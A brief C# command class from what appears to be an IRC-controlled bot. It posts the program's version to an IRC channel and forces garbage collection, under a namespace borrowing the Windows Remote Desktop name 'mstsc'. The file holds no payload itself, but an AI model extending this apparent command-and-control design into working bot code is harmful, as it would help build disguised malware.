using System;

namespace mstsc.Aries.Commands
{
sealed class Version
    {
        public Version()
        {
            Main.Instance.IRCClient.MessageCurrentChannel("{Version} v" + Config.Version);
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }
    }
}
